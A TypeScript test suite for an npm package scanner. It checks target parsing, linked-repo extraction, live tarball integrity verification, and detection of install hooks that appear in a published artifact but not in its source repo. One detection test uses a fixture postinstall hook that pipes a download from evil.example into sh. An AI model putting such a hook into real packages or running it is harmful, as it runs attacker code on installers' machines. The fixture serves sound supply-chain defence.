/**
 * Tests for the npm registry resolver — the real published-artifact scan.
 *
 * The scanner's whole npm claim is that it inspects the ACTUAL tarball `npm install`
 * fetches, not a linked GitHub repo that can diverge from it. These tests guard:
 *   1. Target parsing (bare / scoped / npm: / npmjs.com URL / version) and the
 *      conservative refusal to grab a GitHub owner/repo.
 *   2. Divergence detection in BOTH directions — a matching artifact is clean, an
 *      install hook present in the tarball but NOT its source is called out as the
 *      compromised-publish shape.
 *   3. A live integration pass: a real package downloads, integrity-verifies, and
 *      unpacks to its real files. (Network — skipped automatically when offline.)
 *
 * Run: `deno test --allow-net supabase/functions/_shared/npm.test.ts`
 */

import { assert, assertEquals } from "jsr:@std/assert@1";
import {
  buildDivergence,
  installHooksOf,
  isValidNpmName,
  linkedRepoFrom,
  type NpmLinkedRepo,
  parseNpmTarget,
  resolveNpmPackage,
} from "./npm.ts";

// ── target parsing ───────────────────────────────────────────────────────────

Deno.test("parseNpmTarget: bare, scoped, npm:, npmjs.com URL, and versions", () => {
  assertEquals(parseNpmTarget("left-pad"), { name: "left-pad" });
  assertEquals(parseNpmTarget("@babel/core"), { name: "@babel/core" });
  assertEquals(parseNpmTarget("npm:react@18.2.0"), { name: "react", version: "18.2.0" });
  assertEquals(parseNpmTarget("@scope/pkg@1.0.0"), { name: "@scope/pkg", version: "1.0.0" });
  assertEquals(parseNpmTarget("https://www.npmjs.com/package/lodash"), { name: "lodash" });
  assertEquals(
    parseNpmTarget("https://www.npmjs.com/package/@babel/core/v/7.0.0"),
    { name: "@babel/core", version: "7.0.0" },
  );
});

Deno.test("parseNpmTarget: an owner/repo pair is NOT an npm target (left for the GitHub parser)", () => {
  assertEquals(parseNpmTarget("facebook/react"), null);
  assertEquals(parseNpmTarget("owner/repo/extra"), null);
  assertEquals(parseNpmTarget(""), null);
  assertEquals(parseNpmTarget("not a package!"), null);
});

Deno.test("isValidNpmName: grammar bounds", () => {
  assert(isValidNpmName("left-pad"));
  assert(isValidNpmName("@scope/name"));
  assert(!isValidNpmName("@scope/"));
  assert(!isValidNpmName("has space"));
  assert(!isValidNpmName("a".repeat(215)));
});

Deno.test("linkedRepoFrom: the many shapes of an npm repository field", () => {
  const shapes = [
    "git+https://github.com/owner/repo.git",
    "https://github.com/owner/repo",
    "git@github.com:owner/repo.git",
    "github:owner/repo",
  ];
  for (const url of shapes) {
    assertEquals(linkedRepoFrom(url), { host: "github", owner: "owner", repo: "repo" }, url);
    assertEquals(linkedRepoFrom({ type: "git", url }), { host: "github", owner: "owner", repo: "repo" }, url);
  }
  assertEquals(linkedRepoFrom("https://gitlab.com/owner/repo"), null);
  assertEquals(linkedRepoFrom(undefined), null);
});

// ── divergence detection (the compromised-publish detector) ──────────────────

const LINKED: NpmLinkedRepo = { host: "github", owner: "owner", repo: "repo" };

Deno.test("divergence Direction-clean: artifact hooks match source → no added hooks, no alarm", () => {
  const div = buildDivergence(
    { postinstall: "node build.js", test: "mocha" },
    "1.0.0",
    LINKED,
    { scripts: { postinstall: "node build.js" }, version: "1.0.0" },
  );
  assertEquals(div.compared, true);
  assertEquals(div.addedInstallHooks, []);
  assertEquals(div.versionMismatch, false);
  assertEquals(div.notes, []);
});

Deno.test("divergence Direction-attack: an install hook in the ARTIFACT but not its SOURCE is flagged", () => {
  // The compromised-publish shape: the tarball injects a postinstall the repo
  // never had. This is exactly what scanning only the linked repo would miss.
  const div = buildDivergence(
    { postinstall: "curl https://evil.example/x | sh" },
    "1.0.1",
    LINKED,
    { scripts: { build: "tsc" }, version: "1.0.1" }, // source has NO install hook
  );
  assertEquals(div.compared, true);
  assertEquals(div.addedInstallHooks, ["postinstall"]);
  assert(div.notes.length === 1);
  assert(/compromised-publish/i.test(div.notes[0]), "must name the compromised-publish shape");
});

Deno.test("divergence: version mismatch between artifact and source is recorded", () => {
  const div = buildDivergence({}, "9.9.9", LINKED, { scripts: {}, version: "1.0.0" });
  assertEquals(div.versionMismatch, true);
});

Deno.test("divergence: no linked repo, but the artifact has an install hook → surfaced, not confirmed", () => {
  const div = buildDivergence({ postinstall: "node x.js" }, "1.0.0", null, null);
  assertEquals(div.compared, false);
  assertEquals(div.addedInstallHooks, []); // cannot CONFIRM divergence with no source…
  assert(div.notes.length === 1); // …but the uncorroborated install hook is stated honestly.
});

Deno.test("installHooksOf: only pre/post/install lifecycle keys count", () => {
  assertEquals(
    installHooksOf({ preinstall: "a", install: "b", postinstall: "c", build: "d", test: "" }),
    ["preinstall", "install", "postinstall"],
  );
  assertEquals(installHooksOf(undefined), []);
});

// ── live integration: the real artifact downloads, verifies, and unpacks ─────

Deno.test("LIVE: resolveNpmPackage integrity-verifies and unpacks the real is-odd tarball", async () => {
  let r;
  try {
    r = await resolveNpmPackage({ name: "is-odd", version: "3.0.1" });
  } catch (e) {
    // Offline / registry unreachable — do not fail the suite on network absence.
    console.warn(`skipping LIVE npm test (registry unreachable): ${(e as Error).message}`);
    return;
  }
  assertEquals(r.metadata.name, "is-odd");
  assertEquals(r.metadata.version, "3.0.1");
  assertEquals(r.metadata.integrityVerified, true, "the published tarball must integrity-verify");
  assert(r.metadata.integrityAlgo?.startsWith("sha"), "an integrity algorithm must be recorded");
  // We scanned the REAL artifact's files (package.json is always shipped in a tarball).
  assert(r.files.some((f) => f.path === "package.json"), "the tarball's package.json must be extracted");
  // artifactKey is a stable per-artifact cache key (the SRI digest here).
  assert(r.artifactKey.length > 0);
});
